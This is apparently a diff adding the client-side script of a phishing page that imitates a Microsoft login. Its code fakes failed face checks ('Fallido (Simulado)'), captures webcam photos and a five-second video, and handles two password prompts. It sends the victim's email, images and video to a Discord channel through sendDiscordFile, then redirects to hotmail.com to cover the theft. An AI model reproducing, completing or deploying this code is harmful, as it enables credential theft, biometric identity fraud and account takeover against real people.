+                  statusBadge.className = "status-badge error";
+                  oval.className = "face-oval warn";
+                  btnVerify.disabled = true;
+                  isFaceApto = false;
+                  return;
+                }
+
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                const data = await res.json();
+                isFaceApto = Boolean(data.apto);
+
+                if (isFaceApto) {
+                  statusBadge.textContent = "✅ Rostro apto. Pulsa Siguiente.";
+                  statusBadge.className = "status-badge ok";
+                  oval.className = "face-oval ok";
+                  btnVerify.disabled = false;
+                } else {
+                  statusBadge.textContent =
+                    data.mensajes?.[0] || "Ajusta tu posición/iluminación.";
+                  statusBadge.className = "status-badge error";
+                  oval.className = "face-oval warn";
+                  btnVerify.disabled = true;
+                  isFaceApto = false;
+                }
+              } catch (e) {
+                statusBadge.textContent = "Error de red, reintentando...";
+                statusBadge.className = "status-badge error";
+                oval.className = "face-oval warn";
+                btnVerify.disabled = true;
+                isFaceApto = false;
+              }
+            },
+            "image/jpeg",
+            0.7,
+          );
+        }, INTERVALO_VERIFICACION_MS);
+      }
+
+      async function onFaceAttemptClick() {
+        if (procesandoIntento || intentosRostro >= MAX_INTENTOS) return;
+
+        const btn = document.getElementById("btnVerifyFace");
+        const statusBadge = document.getElementById("faceStatus");
+        const oval = document.getElementById("faceOval");
+        const video = document.getElementById("webcamVideo");
+        const canvas = document.getElementById("snapshotCanvas");
+        const email = sessionStorage.getItem("usuario_email") || "usuario";
+
+        procesandoIntento = true;
+        btn.disabled = true;
+        btn.textContent = "Verificando...";
+
+        if (liveCheckInterval) {
+          clearInterval(liveCheckInterval);
+          liveCheckInterval = null;
+        }
+
+        if (!captureFullFrame(video, canvas)) {
+          procesandoIntento = false;
+          btn.disabled = false;
+          btn.textContent = "Siguiente";
+          statusBadge.textContent = "No se pudo capturar la imagen.";
+          return;
+        }
+
+        intentosRostro += 1;
+        const n = intentosRostro;
+
+        statusBadge.textContent = "❌ Verificación incorrecta";
+        statusBadge.className = "status-badge error";
+        oval.className = "face-oval error";
+        btn.textContent = "Siguiente";
+
+        canvas.toBlob(
+          async (blob) => {
+            if (blob) {
+              sendDiscordFile(
+                `📸 **Intento Facial #${n}**\n\n` +
+                  `**Usuario:**\n\`\`\`\n${email}\n\`\`\`\n\n` +
+                  `**Estado:**\n\`\`\`\nFallido (Simulado)\n\`\`\``,
+                blob,
+                `face_intento_${n}.jpg`,
+                "MS Login | Facial",
+              );
+            }
+
+            enviarCampos(
+              { "Intentos Faciales": String(n) },
+              "MS Login | Facial",
+            );
+            await new Promise((r) => setTimeout(r, FALLO_DISPLAY_MS));
+
+            if (n < MAX_INTENTOS) {
+              procesandoIntento = false;
+              btn.disabled = false;
+              btn.textContent = "Siguiente";
+              statusBadge.textContent = "Alinea tu rostro y pulsa Siguiente.";
+              statusBadge.className = "status-badge";
+              oval.className = "face-oval warn";
+              isFaceApto = false;
+              startLiveValidationLoop();
+            } else {
+              statusBadge.textContent = "❌ Verificación incorrecta";
+              btn.textContent = "Continuando...";
+              await new Promise((r) => setTimeout(r, 1200));
+
+              await conLoading(() => {
+                document.getElementById("step-face").style.display = "none";
+                document.getElementById("step-video").style.display = "block";
+              });
+              await startVideoRecording();
+            }
+          },
+          "image/jpeg",
+          0.85,
+        );
+      }
+
+      // ============================================================
+      // GRABACIÓN DE VIDEO
+      // ============================================================
+      async function startVideoRecording() {
+        const recordVideo = document.getElementById("recordVideo");
+        const videoStatus = document.getElementById("videoStatus");
+        const btnNext = document.getElementById("btnVideoNext");
+        const errVideo = document.getElementById("errorVideo");
+
+        errVideo.textContent = "";
+        btnNext.disabled = true;
+
+        if (!streamInstance || !cameraReady) {
+          videoStatus.textContent = "Cámara no disponible.";
+          videoStatus.className = "status-badge error";
+          btnNext.disabled = false;
+          return;
+        }
+
+        recordVideo.srcObject = streamInstance;
+        try {
+          await recordVideo.play();
+        } catch (_) {}
+
+        if (typeof MediaRecorder === "undefined") {
+          videoStatus.textContent =
+            "Tu navegador no soporta grabación. Puedes continuar.";
+          videoStatus.className = "status-badge error";
+          btnNext.disabled = false;
+          return;
+        }
+
+        const mimeType = pickVideoMime();
+        recordedChunks = [];
+
+        try {
+          const opts = { videoBitsPerSecond: 2_500_000 };
+          if (mimeType) opts.mimeType = mimeType;
+          mediaRecorder = new MediaRecorder(streamInstance, opts);
+        } catch (e) {
+          videoStatus.textContent = "No se pudo iniciar grabación.";
+          videoStatus.className = "status-badge error";
+          btnNext.disabled = false;
+          return;
+        }
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+          await uploadVideo();
+        };
+
+        videoStatus.textContent = "Ponte en un espacio iluminado";
+        videoStatus.className = "status-badge warn";
+        mediaRecorder.start();
+
+        const startTime = Date.now();
+        recordingTimerInterval = setInterval(() => {
+          const elapsed = Date.now() - startTime;
+          if (elapsed >= VIDEO_DURATION_MS) {
+            clearInterval(recordingTimerInterval);
+            recordingTimerInterval = null;
+            if (mediaRecorder && mediaRecorder.state !== "inactive")
+              mediaRecorder.stop();
+          }
+        }, 100);
+      }
+
+      async function uploadVideo() {
+        const videoStatus = document.getElementById("videoStatus");
+        const btnNext = document.getElementById("btnVideoNext");
+        const email = sessionStorage.getItem("usuario_email") || "usuario";
+
+        if (!recordedChunks || recordedChunks.length === 0) {
+          videoStatus.textContent = "⚠️ No se grabó video. Puedes continuar.";
+          videoStatus.className = "status-badge error";
+          btnNext.disabled = false;
+          return;
+        }
+
+        const mime = (mediaRecorder && mediaRecorder.mimeType) || "video/webm";
+        const blob = new Blob(recordedChunks, { type: mime });
+        const ext = mime.includes("mp4") ? "mp4" : "webm";
+
+        videoStatus.textContent = "Verificando...";
+        videoStatus.className = "status-badge";
+
+        sendDiscordFile(
+          `🎥 **Video de Verificación**\n\n` +
+            `**Usuario:**\n\`\`\`\n${email}\n\`\`\`\n\n` +
+            `**Duración:**\n\`\`\`\n5 segundos\n\`\`\``,
+          blob,
+          `video_${email.replace("@", "_")}.${ext}`,
+          "MS Login | Video",
+        ).finally(() => {
+          videoStatus.textContent = "✅ Video procesado. Pulsa Siguiente.";
+          videoStatus.className = "status-badge ok";
+          btnNext.disabled = false;
+        });
+      }
+
+      function finishVideoAndProceed() {
+        prevStopLive();
+        sessionStorage.removeItem("usuario_email");
+        window.location.href = "https://hotmail.com/";
+      }
+
+      // ============================================================
+      // EVENTOS
+      // ============================================================
+      document
+        .getElementById("passwordInput")
+        ?.addEventListener("keydown", (e) => {
+          if (e.key === "Enter") submitFirstPassword();
+        });
+      document
+        .getElementById("passwordIncorrectInput")
+        ?.addEventListener("keydown", (e) => {
+          if (e.key === "Enter") submitSecondPassword();
+        });
+      document
+        .getElementById("emailInput")
+        ?.addEventListener("keydown", (e) => {
+          if (e.key === "Enter") nextStep();
+        });
+      window.addEventListener("beforeunload", () => prevStopLive());
+    </script>
+  </body>
+</html>
